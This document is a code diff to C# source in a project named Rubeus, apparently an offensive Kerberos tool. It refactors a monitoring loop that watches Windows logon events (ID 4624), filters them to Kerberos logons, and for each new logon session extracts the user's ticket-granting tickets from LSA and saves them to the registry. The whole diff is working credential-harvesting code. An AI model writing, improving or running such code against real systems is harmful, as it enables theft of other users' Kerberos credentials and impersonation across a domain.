@@ -4,6 +4,7 @@ using System.ComponentModel;
 using System.Diagnostics.Eventing.Reader;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
+using System.Threading;
 
 namespace Rubeus
 {
@@ -103,7 +104,7 @@ namespace Rubeus
                     }
                 }
 
-                for(int i = creds.Count - 1; i >= 0; i--)
+                for (int i = creds.Count - 1; i >= 0; i--)
                 {
                     DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(creds[i].enc_part.ticket_info[0].endtime);
                     DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(creds[i].enc_part.ticket_info[0].renew_till);
@@ -137,7 +138,8 @@ namespace Rubeus
                 {
                     LSA.SaveTicketsToRegistry(creds, registryBasePath);
                 }
-                System.Threading.Thread.Sleep(intervalMinutes * 60 * 1000);
+
+                Thread.Sleep(intervalMinutes * 60 * 1000);
             }
         }
 
@@ -161,7 +163,6 @@ namespace Rubeus
             if (!String.IsNullOrEmpty(targetUser))
             {
                 Console.WriteLine("[*] Target user : {0}", targetUser);
-                targetUser = targetUser.Replace("$", "\\$");
             }
             Console.WriteLine();
 
@@ -169,7 +170,7 @@ namespace Rubeus
             while (true)
             {
                 // check for 4624 logon events in the past "intervalSeconds"
-                string queryString = String.Format("*[System[EventID=4624 and TimeCreated[timediff(@SystemTime) <= {0}]]]", intervalSeconds * 1000);
+                string queryString = String.Format("*[System[EventID=4624 and TimeCreated[timediff(@SystemTime) <= {0}]]] and *[EventData[Data[@Name='AuthenticationPackageName']='Kerberos']]", (intervalSeconds+3) * 1000);
                 EventLogQuery eventsQuery = new EventLogQuery("Security", PathType.LogName, queryString);
                 EventLogReader logReader = new EventLogReader(eventsQuery);
 
@@ -179,67 +180,45 @@ namespace Rubeus
                     string eventMessage = eventInstance.FormatDescription();
                     DateTime eventTime = (DateTime)eventInstance.TimeCreated;
 
-                    int startIndex = eventMessage.IndexOf("New Logon:");
-                    string message = eventMessage.Substring(startIndex);
+                    
+                    string targetUserName = eventInstance.Properties[5].Value.ToString();
+                    string targetUserDomain = eventInstance.Properties[6].Value.ToString();
+                    string targetLogonId = eventInstance.Properties[7].Value.ToString();
+                    string srcNetworkAddress = eventInstance.Properties[18].Value.ToString();
 
-                    // extract out relevant information from the event log message
-                    var acctNameExpression = new Regex(string.Format(@"\n.*Account Name:\s*(?<name>.+?)\r\n"));
-                    Match acctNameMatch = acctNameExpression.Match(message);
-                    var acctDomainExpression = new Regex(string.Format(@"\n.*Account Domain:\s*(?<domain>.+?)\r\n"));
-                    Match acctDomainMatch = acctDomainExpression.Match(message);
-
-                    if (acctNameMatch.Success)
+                    // ignore SYSTEM logons and other defaults
+                    if (Regex.IsMatch(targetUserName,
+                        @"^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE|UMFD-[0-9]+|DWM-[0-9]+|ANONYMOUS LOGON)$",
+                        RegexOptions.IgnoreCase))
                     {
-                        var srcNetworkExpression = new Regex(string.Format(@"\n.*Source Network Address:\s*(?<address>.+?)\r\n"));
-                        Match srcNetworkMatch = srcNetworkExpression.Match(message);
+                        continue;
+                    }
 
-                        string logonName = acctNameMatch.Groups["name"].Value;
-                        string accountDomain = "";
-                        string srcNetworkAddress = "";
-                        try
-                        {
-                            accountDomain = acctDomainMatch.Groups["domain"].Value;
-                        }
-                        catch { }
-                        try
-                        {
-                            srcNetworkAddress = srcNetworkMatch.Groups["address"].Value;
-                        }
-                        catch { }
+                    Console.WriteLine("\r\n[+] {0} - 4624 logon event for '{1}\\{2}' from '{3}'", eventTime, targetUserDomain, targetUserName, srcNetworkAddress);
+                    // filter if we're targeting a specific user
+                    if (targetUser != null && !Regex.IsMatch(targetUserName, Regex.Escape(targetUser), RegexOptions.IgnoreCase))
+                    {
+                        continue;
+                    }
 
-                        // ignore SYSTEM logons and other defaults
-                        if (!Regex.IsMatch(logonName, @"SYSTEM|LOCAL SERVICE|NETWORK SERVICE|UMFD-[0-9]+|DWM-[0-9]+|ANONYMOUS LOGON", RegexOptions.IgnoreCase))
+                    try
+                    {
+                        // check if we've seen this LUID before
+                        Interop.LUID luid = new Interop.LUID(targetLogonId);
+                        if (!seenLUIDs.ContainsKey((ulong)luid))
                         {
-                            Console.WriteLine("\r\n[+] {0} - 4624 logon event for '{1}\\{2}' from '{3}'", eventTime, accountDomain, logonName, srcNetworkAddress);
-                            // filter if we're targeting a specific user
-                            if (String.IsNullOrEmpty(targetUser) || (Regex.IsMatch(logonName, targetUser, RegexOptions.IgnoreCase)))
-                            {
-                                var expression2 = new Regex(string.Format(@"\n.*Logon ID:\s*(?<id>.+?)\r\n"));
-                                Match match2 = expression2.Match(message);
-
-                                if (match2.Success)
-                                {
-                                    try
-                                    {
-                                        // check if we've seen this LUID before
-                                        Interop.LUID luid = new Interop.LUID(match2.Groups["id"].Value);
-                                        if (!seenLUIDs.ContainsKey((ulong)luid))
-                                        {
-                                            seenLUIDs[luid] = true;
-                                            // if we haven't seen it, extract any TGTs for that particular logon ID
-                                            LSA.ListKerberosTicketData(luid, "krbtgt", true, registryBasePath);
-                                        }
-                                    }
-                                    catch (Exception e)
-                                    {
-                                        Console.WriteLine("[X] Exception: {0}", e.Message);
-                                    }
-                                }
-                            }
+                            seenLUIDs[luid] = true;
+                            // if we haven't seen it, extract any TGTs for that particular logon ID
+                            LSA.ListKerberosTicketData(luid, "krbtgt", true, registryBasePath);
                         }
                     }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("[X] Exception: {0}", e.Message);
+                    }
                 }
-                System.Threading.Thread.Sleep(intervalSeconds * 1000);
+
+                Thread.Sleep(intervalSeconds * 1000);
             }
         }
     }
